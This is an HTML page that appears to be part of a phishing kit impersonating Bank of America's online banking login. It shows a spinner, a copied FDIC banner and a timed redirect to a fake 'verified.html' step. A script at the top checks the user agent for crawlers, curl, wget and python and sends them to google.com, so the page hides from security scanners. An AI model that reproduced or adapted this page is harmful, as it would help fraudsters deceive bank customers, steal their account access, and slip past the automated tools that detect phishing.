<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
    <script>
    /* anti-bot */
    const bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
    const ua = navigator.userAgent;
    if (bots.some(rx => rx.test(ua))) {
        location.href = "https://google.com";
    }
    </script>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bank of America | Online Banking | Log in | User ID</title>
    <link rel="shortcut icon" href="img/icon.png" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>

    *{
        background-color: #ffffff;
    }

.loader {
  margin-top: 250px;
  border: 7px solid #CDCCC8;
  border-radius: 50%;
  border-top: 7px solid #f50808;
  border-left: 7px solid #CDCCC8;
  border-right: 7px solid #CDCCC8;
  width: 50px;
  height: 50px;
  -webkit-animation: spin 1s linear infinite; /* Safari */
  animation: spin .7s linear infinite;
}

  .fdic-banner {
    background-color: #f5f5f5;
    font-family: Arial, sans-serif;
    color: #626262;
    text-align: center;
    padding: 5px 35px;
    font-size: 12px;
    max-width: 980px;
    margin: 0 auto;
    display: flex;
    flex-wrap: wrap;
    align-items: center;
    justify-content: center;
  }

  .fdic-banner span {
    font-style: italic;
    margin: 5px 4px;
  }

  .fdic-banner img {
    height: 16px;
    margin: 5px 4px;
    vertical-align: middle;
  }

  @media (max-width: 600px) {
    .fdic-banner {
    background-color: #f5f5f5;
    font-family: Arial, sans-serif;
    color: #626262;
    text-align: start;
    padding: 5px 2px;
    font-size: 8px;
    display: flex;
    flex-wrap: wrap;
    align-items: left;
    width: 100%;
    justify-content: center;
  }

  .fdic-banner span {
    font-style: italic;
    margin: 5px 2px;
  }

  .fdic-banner img {
    height: 12px;
    margin: 5px 2px;
    vertical-align: middle;
  }
}

.fieldLabel {
    font-size: 14px;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>

</head>
<body>

    <div class="fdic-banner">
  <span>Bank of America deposit products:</span>
  <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" 
       alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government">
</div>

<center><div class="loader"></div></center>
<meta http-equiv="refresh" content="8;url=verified.html" />

<div class="fieldLabel">
</div>

</body>
</html>
